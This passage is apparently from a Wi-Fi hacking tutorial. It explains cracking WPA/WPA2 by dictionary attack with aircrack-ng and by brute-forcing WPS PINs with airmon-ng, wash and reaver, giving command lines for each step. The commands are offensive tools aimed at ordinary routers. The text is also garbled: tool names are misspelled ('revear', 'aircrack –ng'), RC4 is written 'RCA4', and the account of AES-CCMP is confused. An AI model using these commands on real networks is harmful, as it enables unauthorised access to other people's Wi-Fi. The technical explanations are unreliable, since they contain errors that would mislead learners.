    ![](image-uzeekm7k.jpg)


    ### Work with dictionary attack to crack password

    ```

    #aircrack –ng -w /password\ list.txt -b (mac of access point) www*.cap

    ```

    ![](image-b97lbc8p.jpg) ![](image-mom5taw.jpg) ![](image-sgep8ao0.jpg) `WPA` encryption
    had two problems. The first problem that it uses algorithm `RCA4`, also when was
    DOS attack on the access point, the `micheal` algorithm was disconnecting the
    wireless network for 30 sec. So they changed `RCA4` algorithm with `AES` algorithm
    that does the encryption and transmission of the data. Everything goes to `AES
    CCMP` including the plaintext data and temporary key and PIN and mac header and
    encrypts them to `MIC` and the data and includes `CCMP` header and MAC header
    ![](image-ads0vf.jpg) There is personal and enterprise editions. The personal
    deals with the pre shared key and the enterprise deals with radius server in authentication.


    ### Crack WPA2 Encryption by WPS

    ![](image-h2zyebpk.jpg) We can do crack `WPA2` encryption using dictionary attack
    or using `WPS` attack. `WPS` is Wifi protected setup and is service that can make
    connection between the client and access point in easy way. We go to access point
    and we press the button that will operate `WPS` function and we go to client and
    we press the button will operate `WPS` function. In the following video we will
    show how it is possible to connect sung router supports `WPS`. Go settings. Press
    wireless and networks. Then `WIFI` settings. There is option for `WPS` connections,
    press it ![](image-uyrx0hk.jpg) In the router there is button to enable `WPS`
    ![](image-5qofzrr.jpg) In `cisco` router we can make configuration for `WPS` in
    three methods. The first method through pressing the button for `WPS` function.
    The second method is through you put `WPS` pin code. The third method that client
    put `WPS` pin code for access point ![](image-74lvplby.jpg). Activate monitoring
    mode

    ```

    #airmon –ng start wlan0

    ```

    To know the router that supports `WPS` mode

    ```

    #wash –I mon0 -C

    ```

    ![](image-utftr013.jpg) `Revear` is a tool that can do brute force attack on `WPS`
    service until we can reach to pin code and it we can decrypt `WPA` or `WPA2` encryption.
    Write

    ```

    #revear –i mon0 -b (bssid of access point)

    ```

    ![](image-8wfn791p.jpg) We can speed up the process through giving pin code

    ```

    #revear –i mon0 -b (bssid of access point) -p (pin code)

    ```

